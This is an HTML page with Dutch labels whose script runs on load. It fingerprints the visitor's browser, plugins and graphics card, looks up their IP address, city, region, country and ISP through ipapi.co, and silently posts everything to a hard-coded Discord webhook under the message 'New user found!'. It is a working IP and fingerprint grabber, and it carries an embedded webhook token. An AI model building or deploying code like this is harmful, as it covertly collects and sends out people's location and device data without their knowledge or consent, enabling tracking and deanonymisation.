<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Informatie Verzameling</title>
</head>
<body>
    <h1>Gebruikersinformatie</h1>
    <pre id="info"></pre>

    <script>
        async function getInfo() {
            let info = {};

            // Basis browser info
            info.userAgent = navigator.userAgent;
            info.language = navigator.language;
            info.platform = navigator.platform;
            info.screenResolution = `${screen.width}x${screen.height}`;
            info.colorDepth = screen.colorDepth;
            info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            info.online = navigator.onLine;
            info.touchSupport = navigator.maxTouchPoints > 0 ? "Yes" : "No";

            // Plugins
            info.plugins = [];
            for (let i = 0; i < navigator.plugins.length; i++) {
                info.plugins.push(navigator.plugins[i].name);
            }

            // WebGL Info (grafische kaart)
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                info.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                info.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            } catch (err) {
                info.webglVendor = "Niet beschikbaar";
                info.webglRenderer = "Niet beschikbaar";
            }

            // IP en locatie via externe API
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                info.ip = data.ip;
                info.city = data.city;
                info.region = data.region;
                info.country = data.country;
                info.org = data.org;
            } catch (err) {
                info.ip = "Niet beschikbaar";
            }

            document.getElementById('info').textContent = JSON.stringify(info, null, 2);

            // Verstuur naar Discord Webhook
            const webhookUrl = 'https://discord.com/api/webhooks/1347877842725371984/SSQUXuH1EbjqDA-UEXf9d_uik63AvOEyG19LiRFbdZuB9XsRpohp37zbFe9T0gCNxnKE';
            const payload = {
                content: 'Nieuwe gebruiker gevonden!',
                embeds: [{
                    title: "Gebruikersinformatie",
                    description: "```json\n" + JSON.stringify(info, null, 2) + "\n```"
                }]
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        }

        getInfo();
    </script>
</body>
</html>
